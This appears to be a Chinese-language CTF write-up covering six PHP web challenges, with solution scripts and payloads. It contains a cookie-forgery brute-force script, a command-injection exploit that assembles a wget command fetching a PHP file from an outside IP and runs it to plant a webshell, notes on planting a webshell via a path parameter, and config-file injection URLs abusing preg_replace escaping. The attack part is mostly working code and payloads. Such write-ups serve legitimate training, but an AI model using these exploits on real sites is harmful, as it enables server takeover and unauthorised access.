# trick 1
考察全局变量GLOBALS

# trick 2
简单的加密
分析一下可以知道我们获得了guest的加密内容以及随机值但不知道key值，而且我们要伪造system加密值

这里system 与 guest只差一个字符所以要爆破一下最后一个字符

```
import requests
import urllib
s = "guest"
s = "".join([chr(ord(i)+10) for i in s])
mid = "BH^IO"
mid = "".join([chr(ord(s[i])^ord(mid[i])) for i in range(5)])
print mid
s1 = "system"
# print s1[-1:]
s1 = "".join([chr(ord(i)+10) for i in s1])
last = s1[-1:]
dic = "1234567890abcdef"
ls = "".join([chr(ord(last)^ord(i)) for i in dic])
print ls

demo = "".join([chr(ord(s1[i])^ord(mid[i])) for i in range(5)])
for i in ls:
    print i
    user = ("WgEG"+demo+i).encode("base64")
    # print 
    cookie = {
    "user":urllib.quote(user)
        }
    re = requests.get("http://127.0.0.1/var/trick%202.php",cookies=cookie)
    print re.content

```

# trick 3
一道简单的代码审计，很明显是要种马

那我们可以随意输入的地方就是path参数
因为我们的输入都能打印出来

path是写入的路径 URL是获取的文件的路径 打印的是写入的路径 所以我们一次是是写不出shell的
首先将此文件写出去 然后利用path特性种马即可

# trick 4
这道题目本地复现的时候出现了很多问题，post传参方式不同也会影响结果
```
#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
def GetShell():
    s=requests.session()
    url = "http://192.168.43.165/ping.php"
    url1 = "http://192.168.60.128/web200-3/src/"
    header = {
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data1={'username':'a','password[]':'a'}
    # s.post(url1,data=data1,headers=header)
    '''
    wget\\
    \ 19\\
    2.\\
    16\\
    8.\\
    60.\\
    12\\
    8\ \\
    1.php\ \\
    -O\ \\
    2.php
    '''
    fileNames = ["2.php", "-O\ \\\\", "1.php\ \\","8\ \\\\", "12\\\\", "60.\\\\", "8.\\\\", "16\\\\","2.\\\\", "\ 19\\\\", "wget\\\\"]
   # 多出的\只是为了充填，无论几个\都是一样的作用
    ip = "0.0.0.1%0a"
    for fileName in fileNames:
        createFileIp = ip + ">" + fileName
        print createFileIp
        data = "ip=" + createFileIp#这里不知道为什么普通的传参不行
        s.post(url, data=data,headers=header,)
    getShIp = ip + "ls%20-t>1"  #新生成的文件输入进1中
    print getShIp
    data = "ip=" + getShIp
    s.post(url, data=data,headers=header)
    getShellIp = ip + "sh%201" # 执行1这个脚本
    print getShellIp
    data = "ip=" + getShellIp
    s.post(url, data=data,headers=header)
if __name__ == "__main__":
    GetShell()
```

# trick 5
简单的加以分析，因为要注入pass中的值，而且pass被过滤所以利用order By来进行比较
但前提是要知道admin的值，所以利用`username='^1^1#&password=1`把用户名爆出来
下面就好写了

# trick 6
一个简单的配置文件写入问题
方法有很多种，但大多是要写两次

## 1
http://127.0.0.1/index.php?option=a';%0aphpinfo();//
http://127.0.0.1/index.php?option=a

## 2 利用 preg_replace函数的问题:
preg_replace函数在处理字符串的时候,会自动对第二个参数的 \ 这个字符进行反转移. 具体为啥要这样干,我也不太懂. 也就是说如果字符串是 \\\',经过 preg_replace()的处理,就变为 \\',单引号就逃出来了.
http://127.0.0.1/index.php?option=a\';phpinfo();//

## 3 preg_replace() 函数的第二个参数的问题
这个方法很巧秒
replacement中可以包含后向引用\n 或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\0和$0代表完整的模式匹配文本。
http://127.0.0.1/test/ph.php?option=;phpinfo();
http://127.0.0.1/test/ph.php?option=%00 或者 http://127.0.0.1/test/ph.php?option=$0